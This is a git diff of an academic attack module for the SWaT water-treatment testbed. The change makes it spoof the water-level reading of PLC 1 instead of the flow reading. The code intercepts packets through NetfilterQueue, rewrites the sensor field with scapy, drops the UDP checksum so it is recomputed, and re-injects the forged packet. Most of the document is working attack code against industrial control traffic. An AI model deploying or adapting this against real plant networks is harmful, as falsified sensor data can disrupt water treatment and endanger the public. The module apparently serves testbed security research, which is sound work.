@@ -1,6 +1,6 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
-# Copyright (c) 2015 David I. Urbina, UTD
+# Copyright (c) 2015 David I. Urbina, david.urbina@utdallas.edu
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -20,29 +20,28 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 # THE SOFTWARE.
 """Secure Water Testbed (SWaT) Singapore University of Technology and Design.
-SWATAttack module to spoof water flow in PLC 1.
+SWATAttack module to inject a constant bias to the water level in PLC 1.
 """
 from __future__ import print_function
-from netfilterqueue import NetfilterQueue
+
 import os
+from netfilterqueue import NetfilterQueue
 
 from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 
-import swat
-import filters
 import scaling
-
+import swat
 
 # Parameters list
-flow = 0
-sflow = 0
+level = 0
+slevel = 0
 
 
 def __spoof(packet):
     pkt = IP(packet.get_payload())
     if swat.SWAT_P1_RIO_AI in pkt:
-        pkt[swat.SWAT_P1_RIO_AI].flow = flow
+        pkt[swat.SWAT_P1_RIO_AI].level = level
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
 
@@ -54,23 +53,23 @@ def start():
     nfqueue = NetfilterQueue()
     nfqueue.bind(0, __spoof)
     try:
-        print("[*] starting water flow spoofing")
+        print("[*] starting water level spoofing")
         nfqueue.run()
     except KeyboardInterrupt:
         __setdown()
-        print("[*] stopping water flow spoofing")
+        print("[*] stopping water level spoofing")
         nfqueue.unbind()
 
 
 def configure():
-    global sflow, flow
-    sflow = input('Set level (m^2/h): ')
-    flow = filters.reverse_scale(sflow, scaling.P1Flow)
+    global slevel, level
+    slevel = input('Set level (mm): ')
+    level = scaling.signal_to_current(slevel, scaling.P1Level)
     params()
 
 
 def params():
-    print('Flow: {} m^2/h ({})'.format(sflow, flow))
+    print('Level: {} mm ({})'.format(slevel, level))
 
 
 def __setup():
